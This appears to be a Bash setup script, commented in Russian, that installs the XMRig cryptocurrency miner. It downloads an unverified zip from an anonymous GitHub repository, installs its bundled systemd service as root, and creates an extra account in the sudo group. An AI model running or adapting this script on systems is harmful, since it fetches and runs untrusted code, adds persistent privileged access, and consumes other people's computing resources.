#!/bin/bash

# Проверяем, существует ли папка /opt/xmrig
if [ -d "/opt/xmrig" ]; then
  echo "Папка /opt/xmrig уже существует. Завершаем скрипт."
  exit 1
fi

# Шаг 1: Создаем папку /opt/xmrig
mkdir /opt/xmrig

# Шаг 2: Скачиваем файл по ссылке
wget -O /root/xmrig-linux.zip https://raw.githubusercontent.com/oxx9807/test/main/xmrig-linux.zip

# Проверяем, успешно ли был скачан файл
if [ $? -ne 0 ]; then
  echo "Не удалось скачать файл. Проверьте интернет-соединение и повторите попытку."
  exit 1
fi

# Шаг 3: Устанавливаем unzip, если не установлен
if ! command -v unzip &>/dev/null; then
  echo "Устанавливаем unzip..."
  sudo apt-get install unzip -y
fi

# Распаковываем файл в /opt/xmrig
unzip /root/xmrig-linux.zip -d /opt/xmrig

# Шаг 4: Добавляем права на выполнение xmrig
chmod +x /opt/xmrig/xmrig

# Шаг 5: Перемещаем xmrig.service в /etc/systemd/system/
mv /opt/xmrig/xmrig.service /etc/systemd/system/

# Шаг 6: Создаем пользователя xmrig без запроса пароля
useradd -m xmrig

# Шаг 7: Добавляем пользователя xmrig в группу sudo
usermod -aG sudo xmrig

# Шаг 8: Устанавливаем systemd, если не установлен
if ! command -v systemctl &>/dev/null; then
  echo "Устанавливаем systemd..."
  sudo apt-get install systemd -y
fi

# Включаем xmrig как службу
sudo systemctl enable xmrig

# Шаг 9: Перезапускаем xmrig
sudo systemctl restart xmrig

echo "Установка и настройка завершены."
